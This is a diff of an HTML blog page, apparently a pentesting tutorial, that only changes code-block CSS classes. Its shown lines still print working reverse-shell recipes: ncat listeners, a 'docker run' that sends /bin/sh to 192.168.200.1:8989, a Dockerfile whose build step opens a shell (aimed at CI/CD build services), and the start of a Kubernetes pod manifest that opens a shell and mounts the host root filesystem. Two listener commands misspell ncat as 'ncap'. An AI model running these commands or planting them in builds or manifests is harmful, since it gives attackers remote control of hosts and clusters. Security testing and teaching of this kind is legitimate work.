@@ -169,12 +169,12 @@
 
 <h2 id="reverse-shell-from-docker-run">Reverse shell from docker run</h2>
 
-<p>Here we want to push a reverse shell back from a machine that we have <code class="highlighter-rouge">docker run</code> access to, this one is pretty simple</p>
+<p>Here we want to push a reverse shell back from a machine that we have <code class="language-plaintext highlighter-rouge">docker run</code> access to, this one is pretty simple</p>
 
 <p><strong>Pentester Machine - 192.168.200.1</strong>
 We just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat -l -p 8989
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat -l -p 8989
 </code></pre></div></div>
 
 <p><strong>Target Machine</strong>
@@ -182,24 +182,24 @@ Here we just need a Docker image that has ncat available. I’ve got one <a href
 
 <p>So we just run this image with ncat parameters to connect back to the pentester machine on 192.168.200.1</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
 </code></pre></div></div>
 
 <h2 id="reverse-shell-from-a-dockerfile">Reverse Shell from a Dockerfile</h2>
 
-<p>So in our next scenario we’ve got the ability to get our Target Machine to do a <code class="highlighter-rouge">docker build</code> on a <code class="highlighter-rouge">Dockerfile</code> that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.</p>
+<p>So in our next scenario we’ve got the ability to get our Target Machine to do a <code class="language-plaintext highlighter-rouge">docker build</code> on a <code class="language-plaintext highlighter-rouge">Dockerfile</code> that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.</p>
 
 <p><strong>Pentester Machine - 192.168.200.1</strong>
 Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncap -l -p 8989
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncap -l -p 8989
 </code></pre></div></div>
 
 <p><strong>Target Machine</strong></p>
 
 <p>Here we need to construct our Dockerfile to pass into the process, this one should work based on a base ubuntu:18.04 image</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM ubuntu:18.04
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM ubuntu:18.04
 
 RUN apt update &amp;&amp; apt install -y nmap
 
@@ -208,7 +208,7 @@ RUN ncat 192.168.200.1 8989 -e /bin/sh
 CMD ["/bin/bash"]
 </code></pre></div></div>
 
-<p>when the <code class="highlighter-rouge">docker build</code> command is executed, the reverse shell will pop during the build process.</p>
+<p>when the <code class="language-plaintext highlighter-rouge">docker build</code> command is executed, the reverse shell will pop during the build process.</p>
 
 <h2 id="kubernetes-cluster">Kubernetes Cluster</h2>
 
@@ -217,14 +217,14 @@ CMD ["/bin/bash"]
 <p><strong>Pentester Machine - 192.168.200.1</strong>
 Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncap -l -p 8989
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncap -l -p 8989
 </code></pre></div></div>
 
 <p><strong>Target Cluster</strong></p>
 
-<p>So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into <code class="highlighter-rouge">/host</code>, although this will fail if a restrictive <code class="highlighter-rouge">PodSecurityPolicy</code> is in place.</p>
+<p>So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into <code class="language-plaintext highlighter-rouge">/host</code>, although this will fail if a restrictive <code class="language-plaintext highlighter-rouge">PodSecurityPolicy</code> is in place.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apiVersion: v1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apiVersion: v1
 kind: Pod
 metadata:
   name: ncat-reverse-shell-pod
